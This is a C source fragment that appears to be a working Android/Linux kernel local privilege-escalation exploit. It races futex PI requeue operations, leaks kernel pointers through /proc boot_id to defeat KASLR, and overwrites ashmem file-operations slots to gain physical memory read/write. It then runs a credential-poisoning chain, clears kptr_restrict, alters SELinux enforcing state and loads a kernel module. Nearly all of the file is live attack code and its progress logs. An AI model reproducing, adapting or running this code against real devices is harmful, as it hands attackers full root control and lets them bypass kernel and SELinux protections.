  if (configfs_write_once(vfd, SLIDE_KPTR_RESTRICT, &zero32, sizeof(zero32)) !=
      (ssize_t)sizeof(zero32)) {
    pr_warning("slide fullroot kptr write failed errno=%d\n", errno);
    return -6;
  }
  pr_success("slide fullroot WIN banked: kptr=0, primitive live "
             "(cred step = chain page-cache poison; ZT thread-hijack route "
             "REMOVED R248 - ctx@0x10a0 outside the task_struct usercopy "
             "whitelist, R245B panic)\n");
  return 1;
}

static unsigned int slide_heal_ack_strict = 1;
static void slide_sig_handler(int sig) {
  (void)sig;
  if (slide_round_win)
    return;
  atomic_store(&slide_pc_win_banked, 1);
  atomic_store(&slide_heal_req, 1);
  atomic_store(&slide_heal_seq, atomic_load(&slide_heal_seq) + 1);
  unsigned long spins = 0;
  unsigned long cap = (unsigned long)env_int_range("SLIDE_HEAL_ACK_SPIN",
                                                   20000000, 1000, 2000000000);
  while (!atomic_load(&slide_heal_ack) && spins < cap)
    spins++;
  if (atomic_load(&slide_heal_ack)) {
    pr_info("slide heal ack spins=%lu\n", spins);
  } else {
    pr_info("slide heal ack TIMEOUT spins=%lu\n", spins);
    if (slide_heal_ack_strict) {
      while (!atomic_load(&slide_heal_ack)) {
        spins++;
      }
    }
  }
  atomic_store(&slide_heal_req, 0);
  atomic_store(&slide_heal_ack, 0);
  atomic_store(&slide_handler_exited, atomic_load(&slide_heal_seq));
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  atomic_store(&slide_owner_tid, (int)syscall(SYS_gettid));
  pr_info("slide owner thread enter tid=%d cpu=%d\n", (int)syscall(SYS_gettid),
          sched_getcpu());
  {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = slide_sig_handler;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) != 0) {
      pr_error("slide owner sigaction failed errno=%d\n", errno);
      return NULL;
    }
    {
      sigset_t us1;
      sigemptyset(&us1);
      sigaddset(&us1, SIGUSR1);
      if (sigprocmask(SIG_UNBLOCK, &us1, NULL) != 0) {
        pr_error("slide owner sigprocmask unblock failed errno=%d\n", errno);
        return NULL;
      }
      pr_info("slide owner SIGUSR1 unblocked (v149 app-domain fix)\n");
    }
  }
  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }
  slide_futex_guard("owner-lock-target", FUTEX_LOCK_PI);
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d -> park\n", errno);
    slide_park_sleep();
  }
  atomic_store(&slide_owner_started, 1);
  atomic_store(&slide_owner_entering, 1);
  int retries = slide_walk_retries();
  volatile unsigned long spin_counter = 0;
  for (int round = 0; round < retries; round++) {
    errno = 0;
    atomic_store_explicit(&slide_owner_entering, 1, memory_order_release);
    slide_futex_guard("owner-dice-lock-chain", FUTEX_LOCK_PI);
    long r = futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 3000);
    atomic_store_explicit(&slide_owner_entering, 0, memory_order_relaxed);
    slide_walk_done = round + 1;
    if (r == 0) {
      break;
    }
    if (slide_round_win || atomic_load(&slide_consume_stop)) {
      break;
    }
    for (spin_counter = 0; spin_counter < 2000000UL; spin_counter++) {
      __asm__ volatile("yield" ::: "memory");
    }
  }
  pr_info("slide owner thread exiting retries=%d done=%d win=%d\n", retries,
          slide_walk_done, slide_round_win);
  if (!slide_round_win) {
    slide_park_sleep();
  }
  return NULL;
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
  uint64_t stext = leaked - off;
  pr_success(
      "slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
      getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n", getpid(),
             (unsigned long long)stext);
  return stext;
}
static void slide_pin_cpu(void) {
  if (env_flag("SLIDE_NO_PIN", 0)) {
    pr_info("slide pin disabled by env (SLIDE_NO_PIN=1)\n");
    return;
  }
  long cpu = env_int_range("SLIDE_PIN_CPU", 2, 0, 1023);
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET((int)cpu, &set);
  if (sched_setaffinity(0, sizeof(set), &set) != 0) {
    pr_warning("slide pin cpu=%ld errno=%d\n", cpu, errno);
    return;
  }
  pr_info("slide pinned cpu=%ld\n", cpu);
}
static void slide_leak_readback_report(void) {
  static int reported;
  if (reported) {
    return;
  }
  const char *tgt = slide_active_target();
  if (!tgt || strcmp(tgt, "leak") != 0) {
    return;
  }
  int fd = payload_peek_fd();
  if (fd < 0) {
    pr_warning("slide leak readback: no peek fd (PAGE_HOLD_SKB=1 required)\n");
    return;
  }
  static unsigned char rb[SKB_SEND_SIZE];
  struct iovec iov;
  iov.iov_base = rb;
  iov.iov_len = sizeof(rb);
  struct msghdr mh;
  memset(&mh, 0, sizeof(mh));
  mh.msg_iov = &iov;
  mh.msg_iovlen = 1;
  ssize_t n = recvmsg(fd, &mh, MSG_PEEK | MSG_DONTWAIT);
  if (n < (ssize_t)(LOCK_OFF + 0x20)) {
    static int warned_short;
    if (!warned_short) {
      slide_probe("leak-rb-short");
      pr_warning("slide leak readback short n=%zd errno=%d\n", n, errno);
      warned_short = 1;
    }
    return;
  }
  uint64_t P = 0;
  memcpy(&P, rb + LOCK_OFF + 0x10, sizeof(P));
  uint64_t rootv = 0, ownv = 0;
  memcpy(&rootv, rb + LOCK_OFF + 0x8, sizeof(rootv));
  memcpy(&ownv, rb + LOCK_OFF + 0x18, sizeof(ownv));
  char pb2[160];
  snprintf(pb2, sizeof(pb2), "leak-rb root=%016llx left=%016llx own=%016llx",
           (unsigned long long)rootv, (unsigned long long)P,
           (unsigned long long)ownv);
  slide_probe(pb2);
  if (rootv == 0 && P == 0 && ownv == 0) {
    static int warned_zero;
    if (!warned_zero) {
      pr_warning("slide leak readback: lock state all-zero\n");
      warned_zero = 1;
    }
    return;
  }
  if (P < 0xffffff0000000000ULL) {
    pr_warning("slide leak readback: slot not a kernel ptr %016llx\n",
               (unsigned long long)P);
    return;
  }
  uint64_t text = P - SLIDE_LEAK_P_OFF;
  char pb[128];
  snprintf(pb, sizeof(pb), "leak-rb P=%016llx text=%016llx off=%llx",
           (unsigned long long)P, (unsigned long long)text,
           (unsigned long long)(text - KIMAGE_TEXT_BASE));
  slide_probe(pb);
  pr_success("slide %s\n", pb);
  reported = 1;
}

static void reaper_note(const char *fmt, ...) {
  char line[256];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(line, sizeof(line), fmt, ap);
  va_end(ap);
  pr_info("slide reaper note %s", line);
}
#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

static void slide_watchdog_dearm(void) {
  if (!env_flag("SLIDE_WDOG_DEARM", 1)) {
    pr_warning("v153 watchdog dearm disabled (SLIDE_WDOG_DEARM=0)\n");
    return;
  }
  int wfd = open_ashmem_device();
  if (wfd < 0) {
    pr_warning("v153 watchdog dearm open failed errno=%d\n", errno);
    return;
  }
  uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
  ssize_t wr = configfs_write_once(wfd, ASHMEM_MISC_FOPS_SLOT, &orig_fops,
                                   sizeof(orig_fops));
  pr_warning("v153 watchdog dearm slot restore wr=%zd errno=%d\n", wr, errno);
  close(wfd);
}

static void slide_reaper_watchdog(void) {
  util_set_oom_protect();
  pid_t reaper = getppid();
  int pfd = (int)syscall(SYS_pidfd_open, reaper, 0);
  struct pollfd pe;
  memset(&pe, 0, sizeof(pe));
  pe.fd = pfd;
  pe.events = POLLIN;
  if (pfd < 0 || poll(&pe, 1, -1) != 1) {
    for (;;) {
      char path[64], buf[512];
      snprintf(path, sizeof(path), "/proc/%d/stat", (int)reaper);
      int sfd = open(path, O_RDONLY);
      if (sfd < 0) {
        break;
      }
      ssize_t n = read(sfd, buf, sizeof(buf) - 1);
      close(sfd);
      if (n <= 0) {
        break;
      }
      buf[n] = 0;
      char *rp = strrchr(buf, ')');
      if (rp && rp[1] == ' ' && rp[2] == 'Z') {
        break;
      }
      usleep(100000);
    }
    pr_warning("v103 watchdog reaper exit: pidfd unavailable, "
               "state-polled\n");
    slide_watchdog_dearm();
    slide_park_sleep();
  }
  char path[64], buf[512];
  int code = -1;
  snprintf(path, sizeof(path), "/proc/%d/stat", (int)reaper);
  int sfd = open(path, O_RDONLY);
  if (sfd >= 0) {
    ssize_t n = read(sfd, buf, sizeof(buf) - 1);
    close(sfd);
    if (n > 0) {
      buf[n] = 0;
      char *rp = strrchr(buf, ')');
      if (rp) {
        int tok = 0;
        char *save = NULL;
        for (char *t = strtok_r(rp + 1, " ", &save); t;
             t = strtok_r(NULL, " ", &save), tok++) {
          if (tok == 49) {
            code = atoi(t);
            break;
          }
        }
      }
    }
  }
  int sig = (code >= 0) ? (code & 0x7f) : -1;
  pr_warning("v103 watchdog reaper exit: WIFEXITED=%d code=%d "
             "WIFSIGNALED=%d sig=%d\n",
             sig == 0 ? 1 : 0, sig == 0 ? ((code >> 8) & 0xff) : -1,
             sig > 0 ? 1 : 0, sig);
  slide_watchdog_dearm();
  slide_park_sleep();
}
static int v148_dearm_fd = -1;
static void v148_dearm_atexit(void) {
  int fd = v148_dearm_fd;
  if (fd < 0)
    return;
  v148_dearm_fd = -1;
  uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
  ssize_t wr = configfs_write_once(fd, ASHMEM_MISC_FOPS_SLOT, &orig_fops,
                                   sizeof(orig_fops));
  printf("[!] [%d] v148 atexit de-arm slot restore wr=%zd\n", getpid(), wr);
  fflush(stdout);
}

static void slide_reaper_run(void) {
  long kill_delay_ms =
      env_int_range("SLIDE_ARM_KILL_DELAY_MS", 20000, 0, 120000);
  int is_b = getenv("SLIDE_TEXT_ADDR") != NULL;
  pr_info("slide reaper enter pid=%d ppid=%d delay_ms=%ld b=%d\n", getpid(),
          getppid(), kill_delay_ms, is_b);
  reaper_note("enter pid=%d ppid=%d delay_ms=%ld b=%d", getpid(), getppid(),
              kill_delay_ms, is_b);
  {
    pid_t wdog = fork();
    if (wdog == 0) {
      slide_reaper_watchdog();
    } else if (wdog < 0) {
      pr_warning("v103 watchdog fork failed errno=%d\n", errno);
    }
  }
  if (!is_b) {
    pr_warning("slide reaper a-miss: no-kill (owner reblocked; SIGKILL "
               "would BUG rtmutex_common.h:118) -> park\n");
    slide_park_sleep();
  }
  errno = 0;
  int pfd = payload_peek_fd();
  uint64_t slot_val = (uint64_t)ASHMEM_MISC_FOPS_SLOT;
  size_t peek_win = 0x2400;
  unsigned char rbuf[peek_win];
  unsigned char base_buf[peek_win];
  int have_base = 0;
  int reported = 0;
  int armed = 0;
  int v117_i2_done = 0;
  if (pfd < 0) {
    pr_warning("slide reaper no peek fd - arm detection unavailable\n");
    reaper_note("no-peek-fd arm-detection-unavailable");
  }
  int peek_iters = (int)env_int_range("SLIDE_REAPER_PEEKS", 32, 1, 4000);
  int blind_chain = env_flag("SLIDE_REAPER_BLIND_CHAIN", 0);
  if (blind_chain) {
    int blind_cap = (int)env_int_range("SLIDE_REAPER_BLIND_PEEKS", 8, 1, 4000);
    if (blind_cap < peek_iters) {
      peek_iters = blind_cap;
    }
    reaper_note("v102 blind-chain peek cap=%d", peek_iters);
  }
  for (int i = 0; i < peek_iters && !armed; i++) {
    usleep(250000);
    if (pfd < 0) {
      continue;
    }
    ssize_t rd = recv(pfd, rbuf, sizeof(rbuf), MSG_PEEK | MSG_DONTWAIT);
    if (rd < (ssize_t)(FOPS_TABLE_OFF + 0x18)) {
      if ((i % 8) == 0) {
        reaper_note("peek i=%d short rd=%zd", i, rd);
      }
      continue;
    }
    uint64_t left_slot = 0;
    memcpy(&left_slot, rbuf + FOPS_TABLE_OFF + 0x08, sizeof(left_slot));
    {
      uint64_t s16a = 0, s16b = 0, f188 = 0;
      int diffv;
      memcpy(&s16a, rbuf + FOPS_TABLE_OFF, 8);
      memcpy(&s16b, rbuf + FOPS_TABLE_OFF + 0x08, 8);
      memcpy(&f188, rbuf + 0x188, 8);
      diffv = have_base
                  ? (memcmp(rbuf, base_buf,
                            sizeof(base_buf) < (size_t)rd ? sizeof(base_buf)
                                                          : (size_t)rd) != 0)
                  : -1;
      reaper_note("peek i=%d rd=%zd slot16=%016llx|%016llx f188=%016llx "
                  "diff=%d",
                  i, rd, (unsigned long long)s16a, (unsigned long long)s16b,
                  (unsigned long long)f188, diffv);
      if (env_flag("SLIDE_V117_I2", 1) && !v117_i2_done) {
        uint64_t bake = (uint64_t)(fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
        const unsigned char *tpl = payload_template();
        int tpldiff =
            tpl ? (memcmp(rbuf, tpl,
                          sizeof(rbuf) < (size_t)rd ? sizeof(rbuf)
                                                    : (size_t)rd) != 0)
                : -1;
        reaper_note(
            "v117 I2 owned@T0 rd=%zd slot16=%016llx|%016llx "
            "bake=%016llx frame=%016llx verdict=%s tpldiff=%d",
            rd, (unsigned long long)s16a, (unsigned long long)s16b,
            (unsigned long long)bake,
            (unsigned long long)(fake_w0 - W0_OFF - (uintptr_t)SKB_DATA_DELTA),
            s16b == bake ? (tpldiff ? "WROTE" : "IN") : "FOREIGN", tpldiff);
        v117_i2_done = 1;
      }
    }
    if (!have_base) {
      memcpy(base_buf, rbuf, sizeof(base_buf));
      have_base = 1;
      reaper_note("peek i=%d baseline rd=%zd left=%016llx want=%016llx", i, rd,
                  (unsigned long long)left_slot, (unsigned long long)slot_val);
      continue;
    }
    size_t ndiff = 0, first = 0;
    int sig = 0;
    for (size_t o = 0; o + 8 <= (size_t)rd && o + 8 <= sizeof(base_buf);
         o += 8) {
      if (memcmp(rbuf + o, base_buf + o, 8) != 0) {
        uint64_t now = 0;
        memcpy(&now, rbuf + o, 8);
        if (ndiff == 0) {
          first = o;
        }
        ndiff++;
        if (now == slot_val) {
          sig = 1;
          uint64_t wasq = 0;
          memcpy(&wasq, base_buf + o, 8);
          reaper_note("peek i=%d SIGNATURE +0x%zx was=%016llx now=%016llx", i,
                      o, (unsigned long long)wasq, (unsigned long long)now);
        }
      }
    }
    if (sig || left_slot == slot_val) {
      armed = 1;
    } else if (ndiff && reported < 8) {
      uint64_t now = 0, was = 0;
      memcpy(&was, base_buf + first, 8);
      memcpy(&now, rbuf + first, 8);
      reaper_note("peek i=%d diff n=%zu first=+0x%zx was=%016llx now=%016llx",
                  i, ndiff, first, (unsigned long long)was,
                  (unsigned long long)now);
      reported++;
    } else if ((i % 16) == 0) {
      reaper_note("peek i=%d rd=%zd no-diff left=%016llx", i, rd,
                  (unsigned long long)left_slot);
    }
  }
  if (!armed && !blind_chain) {
    pr_warning("slide reaper arm-timeout (no erase signature) -> park\n");
    reaper_note("arm-timeout no-erase-signature -> park");
    slide_park_sleep();
  }
  if (!armed) {
    reaper_note("v77 blind-chain: peek window closed with no signature"
                " (medium is blind) -> try chain anyway");
    pr_warning("slide reaper v77 blind-chain -> attempting chain without"
               " page-side signature\n");
  }
  reaper_note("%s left=%016llx -> chain", armed ? "ARMED" : "BLIND",
              (unsigned long long)slot_val);
  slide_probe("reaper-armed");
  util_mark_fops_armed("reaper-b-chain");
  if (!util_frame_guard(slide_dump_cached_fd)) {
    pr_warning("slide reaper v104 frame-foreign -> park (no openat)\n");
    slide_park_sleep();
  }
  int cfd = open_ashmem_device();
  if (cfd >= 0) {
    v148_dearm_fd = cfd;
    atexit(v148_dearm_atexit);
    if (pipebuf_page_base == 0) {
      pipebuf_page_base = prepare_pipe_buffer_page();
    }
    reaper_note("chain pipe-prep base=%llx",
                (unsigned long long)pipebuf_page_base);
    if (pipebuf_page_base != 0) {
      {
        int pdfd = slide_dump_cached_fd;
        uint64_t pre_slot = 0, pre_owner = 0;
        if (pdfd >= 0) {
          ssize_t psrd = configfs_read_once(pdfd, ASHMEM_MISC_FOPS_SLOT,
                                            &pre_slot, sizeof(pre_slot));
          ssize_t pord = configfs_read_once(pdfd, fake_fops, &pre_owner,
                                            sizeof(pre_owner));
          reaper_note("pre-chain slot=%016llx fops_owner=%016llx rd=%zd/%zd",
                      (unsigned long long)pre_slot,
                      (unsigned long long)pre_owner, psrd, pord);
          pr_info("slide reaper pre-chain slot=%016llx fops_owner=%016llx "
                  "rd=%zd/%zd\n",
                  (unsigned long long)pre_slot, (unsigned long long)pre_owner,
                  psrd, pord);
        } else {
          reaper_note("pre-chain slot probe unavailable: no cached fd");
          pr_warning("slide reaper pre-chain slot probe unavailable: no "
                     "cached fd\n");
        }
      }
      if (install_pipe_physrw(cfd)) {
        if (kaslr_done) {
          reaper_note("chain entry kaslr_done=1");
          pr_success("slide reaper chain entry\n");
          run_poison_chain();
          reaper_note("chain done");
        }
        uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
        ssize_t vwr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT,
                                          &orig_fops, sizeof(orig_fops));
        slide_probe("chain:slot-restored");
        reaper_note("slot restore=%d", (int)vwr);
        pr_info("slide reaper slot restore=%zd\n", vwr);
        if (env_int_range("SLIDE_SELINUX_HEAL", 1, 0, 1)) {
          uintptr_t selinux_state = data_addr(SELINUX_ENFORCING);
          uint8_t heal8[8] = {0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00};
          errno = 0;
          int hw =
              pipe_phys_write_data(cfd, selinux_state, heal8, sizeof(heal8));
          int hw_errno = errno;
          uint8_t rb8[8] = {0, 0, 0, 0, 0, 0, 0, 0};
          int hr = pipe_phys_read_data(cfd, selinux_state, rb8, sizeof(rb8));
          int rb_ok = hr;
          uint8_t rb_mask = 0;
          if (hr) {
            for (int i = 0; i < (int)sizeof(heal8); i++) {
              if (rb8[i] != heal8[i]) {
                rb_mask |= (uint8_t)(1u << i);
                rb_ok = 0;
              }
            }
          }
          if (hw && rb_ok) {
            reaper_note("v142 selinux-heal ok enforcing=%u "
                        "checkreqprot=%u initialized=%u caps[0..4]="
                        "%u%u%u%u%u",
                        rb8[0], rb8[1], rb8[2], rb8[3], rb8[4], rb8[5], rb8[6],
                        rb8[7]);
            pr_success("slide reaper v142 selinux-heal ok enforcing=%u "
                       "checkreqprot=%u initialized=%u caps[0..4]="
                       "%u%u%u%u%u\n",
                       rb8[0], rb8[1], rb8[2], rb8[3], rb8[4], rb8[5], rb8[6],
                       rb8[7]);
          } else {
            reaper_note("v142 selinux-heal FAIL wr=%d(errno=%d) rd=%d "
                        "mismatch_mask=0x%02x got=%02x%02x%02x%02x%02x"
                        "%02x%02x%02x - no abort, park proceeds",
                        hw, hw_errno, hr, rb_mask, rb8[0], rb8[1], rb8[2],
                        rb8[3], rb8[4], rb8[5], rb8[6], rb8[7]);
            pr_warning("slide reaper v142 selinux-heal FAIL wr=%d"
                       "(errno=%d) rd=%d mismatch_mask=0x%02x "
                       "got=%02x%02x%02x%02x%02x%02x%02x%02x\n",
                       hw, hw_errno, hr, rb_mask, rb8[0], rb8[1], rb8[2],
                       rb8[3], rb8[4], rb8[5], rb8[6], rb8[7]);
          }
        }
      } else {
        pr_warning("slide reaper install_pipe_physrw failed errno=%d\n", errno);
        reaper_note("install-pipe-physrw failed errno=%d", errno);
        uint64_t slot_now = 0;
        ssize_t srd = configfs_read_once(cfd, ASHMEM_MISC_FOPS_SLOT, &slot_now,
                                         sizeof(slot_now));
        reaper_note("slot-probe rd=%d value=%016llx fake=%016llx", (int)srd,
                    (unsigned long long)slot_now,
                    (unsigned long long)fake_fops);
        pr_info("slide reaper slot-probe rd=%zd value=%016llx fake=%016llx\n",
                srd, (unsigned long long)slot_now,
                (unsigned long long)fake_fops);
        uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
        ssize_t vwr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT,
                                          &orig_fops, sizeof(orig_fops));
        reaper_note("slot restore wr=%d", (int)vwr);
        pr_info("slide reaper slot restore wr=%zd\n", vwr);
      }
    } else {
      pr_warning("slide reaper pipe page prepare failed\n");
      reaper_note("pipe-page-prepare failed");
      uint64_t orig_fops = ASHMEM_FOPS_STRUCT;
      ssize_t vwr = configfs_write_once(cfd, ASHMEM_MISC_FOPS_SLOT, &orig_fops,
                                        sizeof(orig_fops));
      reaper_note("slot restore prep-fail wr=%d", (int)vwr);
      pr_info("slide reaper slot restore prep-fail wr=%zd\n", vwr);
    }
    v148_dearm_fd = -1;
    close(cfd);
  } else {
    reaper_note("chain fresh-open failed errno=%d", errno);
  }
  reaper_note("done -> park");
  pr_success("slide reaper done: parking (no exit, no teardown)\n");
  slide_park_sleep();
}

static void slide_phase_cal_finish(void) {
  const char *ko = getenv("SLIDE_PHASE_CAL_KO");
  if (!ko || !ko[0]) {
    ko = "/data/local/tmp/phase_probe-r613a.ko";
  }
  int fd = (int)syscall(SYS_openat, AT_FDCWD, ko, O_RDONLY, 0);
  if (fd < 0) {
    pr_warning("PHASE-CAL open ko errno=%d\n", errno);
    return;
  }
  char params[192];
  int pl = snprintf(params, sizeof(params), "band=0x%llx lockv=0x%llx",
                    (unsigned long long)page_base,
                    (unsigned long long)slide_lock_addr());
  if (pl < 0 || pl >= (int)sizeof(params)) {
    pr_warning("PHASE-CAL params overflow\n");
    close(fd);
    return;
  }
  long ir = syscall(SYS_finit_module, fd, params, 0);
  int ins_errno = errno;
  close(fd);
  pr_warning("PHASE-CAL insmod ret=%ld errno=%d (phase_probe init returns "
             "-1 by design; boot_id slot below is the verdict)\n",
             ir, ins_errno);
  int bfd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
  if (bfd < 0) {
    pr_warning("PHASE-CAL boot_id open errno=%d\n", errno);
    return;
  }
  unsigned char b[16];
  ssize_t n = read(bfd, b, sizeof(b));
  close(bfd);
  if (n != (ssize_t)sizeof(b)) {
    pr_warning("PHASE-CAL boot_id read n=%zd errno=%d\n", n, errno);
    return;
  }
  uint64_t v0 = 0, v1 = 0;
  memcpy(&v0, b, 8);
  memcpy(&v1, b + 8, 8);
  int hit = (int)(v0 >> 63);
  uint64_t ghost = v0 & 0x3fffULL;
  if (hit) {
    int64_t delta = (int64_t)(0x3b48ULL - ghost);
    pr_success("PHASE-CAL ghost_off=0x%llx slot_val=0x%llx hit=1 "
               "delta=%+lld -> SLIDE_TCP_SHIFT=0x%llx\n",
               (unsigned long long)ghost, (unsigned long long)v1,
               (long long)delta,
               (unsigned long long)(0x78ULL + (uint64_t)delta));
  } else {
    pr_warning("PHASE-CAL ghost_off=0x%llx slot_val=0x%llx hit=0 - no "
               "template ghost on this stack page (spray/reclaim failed "
               "this flow?) - delta unknown\n",
               (unsigned long long)ghost, (unsigned long long)v1);
  }
}

static void slide_phase_cal_parent(void) {
  pr_warning("slide phase-cal: forking calibration child\n");
  setenv("SLIDE_PHASE_CAL", "1", 1);
  setenv("SLIDE_TCP_ROUTE_ARM_SEQ", "999999", 1);
  setenv("SLIDE_TCP_FIRE_BURST", "0", 1);
  setenv("SLIDE_LOCK_SLOT", "5", 1);
  setenv("SLIDE_WAIT_SECONDS", "30", 1);
  pid_t cc = fork();
  if (cc == 0) {
    errno = 0;
    uint64_t st0 = slide_child_leak_stext();
    pr_warning("slide phase-cal child stext=%016llx (unexpected return, "
               "park normally) errno=%d\n",
               (unsigned long long)st0, errno);
    _exit(2);
  }
  int cst = 0;
  pid_t wr = 0;
  for (int i = 0; i < 200 && wr != cc; i++) {
    wr = waitpid(cc, &cst, WNOHANG);
    if (wr == 0) {
      usleep(100000);
    }
  }
  if (wr != cc) {
    kill(cc, SIGKILL);
    waitpid(cc, &cst, 0);
    pr_warning("slide phase-cal child killed status=%d\n", cst);
  } else {
    pr_warning("slide phase-cal child reaped status=%d\n", cst);
  }
}

uint64_t slide_child_leak_stext(void) {
  slide_pin_cpu();
  signal(SIGHUP, SIG_IGN);
  signal(SIGINT, SIG_IGN);
  signal(SIGQUIT, SIG_IGN);
  signal(SIGTERM, SIG_IGN);
  signal(SIGPIPE, SIG_IGN);
  pr_info("slide child-flow pid=%d enter (v91 no-exit-park verdict-painter "
          "pre-fire-reaper v82-repair v2c/v72c-leak v97 repaint-kill v94)\n",
          getpid());
  if (env_flag("SLIDE_RECLAIM_SPRAY", 1)) {
    util_reclaim_payload_spray();
  }
  slide_heal_ack_strict =
      (unsigned int)env_int_range("SLIDE_HEAL_ACK_STRICT", 1, 0, 1);
  pthread_t waiter;
  pthread_t owner;
  pthread_t consumer;
  pthread_t arm_host;
  if (env_flag("SLIDE_V143_HYGIENE", 1)) {
    errno = 0;
    slide_futex_guard("v143-H-A-decoy-hold", FUTEX_LOCK_PI);
    long dr = futex_op(&slide_f_pi_decoy, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
    pr_info("v143 H-A decoy hold ret=%ld errno=%d tid=%d\n", dr, errno,
            (int)syscall(SYS_gettid));
  }
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
  if (slide_v114_twostage()) {
    SYSCHK(pthread_create(&arm_host, NULL, slide_arm_host_thread, NULL));
  }
  if (env_flag("SLIDE_SPLIT_PAINT_CPU", 0)) {
    long pcpu = env_int_range("SLIDE_PAINT_CPU", 3, 0, 1023);
    cpu_set_t pset;
    CPU_ZERO(&pset);
    CPU_SET((int)pcpu, &pset);
    pid_t wtid = pthread_gettid_np(waiter);
    if (sched_setaffinity((int)wtid, sizeof(pset), &pset) != 0) {
      pr_warning("slide split paint cpu=%ld waiter tid=%d errno=%d\n", pcpu,
                 (int)wtid, errno);
    } else {
      pr_info("slide split paint cpu=%ld waiter\n", pcpu);
    }
  }
  if (env_flag("SLIDE_PAINT_RT", 0)) {
    long rcpu = env_int_range("SLIDE_PAINT_CPU", 3, 0, 1023);
    cpu_set_t rset;
    CPU_ZERO(&rset);
    CPU_SET((int)rcpu, &rset);
    pid_t rtid = pthread_gettid_np(waiter);
    struct sched_param sp;
    memset(&sp, 0, sizeof(sp));
    sp.sched_priority = 99;
    errno = 0;
    int sret = sched_setscheduler((int)rtid, SCHED_FIFO, &sp);
    int seterrno = errno;
    errno = 0;
    int aret = sched_setaffinity((int)rtid, sizeof(rset), &rset);
    pr_info("slide paint rt tid=%d fifo=%d(errno=%d) pin=%ld(ret=%d "
            "errno=%d)\n",
            (int)rtid, sret, sret != 0 ? seterrno : 0, rcpu, aret, errno);
  }
  slide_probe("main-threads-up");

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }
  slide_probe("main-waiting-started");
  while (!atomic_load(&slide_owner_entering)) {
    usleep(1000);
  }
  slide_probe("gates-passed");
  usleep(250000);
  slide_probe("pre-requeue");

  errno = 0;
  slide_futex_guard("main-cmp-requeue", FUTEX_CMP_REQUEUE_PI);
  long rq_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                         &slide_f_pi_target, 0);
  int rq_errno = errno;
  if (rq_ret < 0 && rq_errno == EAGAIN) {
    usleep(50000);
    errno = 0;
    slide_futex_guard("main-cmp-requeue-retry", FUTEX_CMP_REQUEUE_PI);
    rq_ret = futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
                      &slide_f_pi_target, 0);
    rq_errno = errno;
  }
  slide_probe("post-requeue");
  pr_info("slide main CMP_REQUEUE_PI ret=%ld errno=%d woken=%ld\n", rq_ret,
          rq_errno, rq_ret > 0 ? rq_ret : 0);
  if (rq_ret < 0 && rq_errno != EDEADLK) {
    pr_warning("slide requeue not armed ret=%ld errno=%d -> bail\n", rq_ret,
               rq_errno);
    pr_warning("slide v91 requeue-bail: parking (no exit, no teardown)\n");
    slide_park_sleep();
  }
  if (rq_ret < 0 && rq_errno == EDEADLK && !env_flag("SLIDE_PAINT_MAIN", 0) &&
      !env_flag("SLIDE_NO_EARLY_WAKE", 0)) {
    errno = 0;
    long wk = futex_op(&slide_f_wait, FUTEX_WAKE, 1, NULL, NULL, 0);
    pr_info("slide main early wake ret=%ld errno=%d\n", wk, errno);
  }
  if (env_flag("SLIDE_PAINT_MAIN", 0)) {
    {
      int rt = slide_paint_route();
      if (rt == 2) {
        slide_adjtimex_stack_copy();
      } else if (rt == 1) {
        slide_tcp_stack_copy();
      } else {
        slide_pselect_stack_copy();
      }
    }
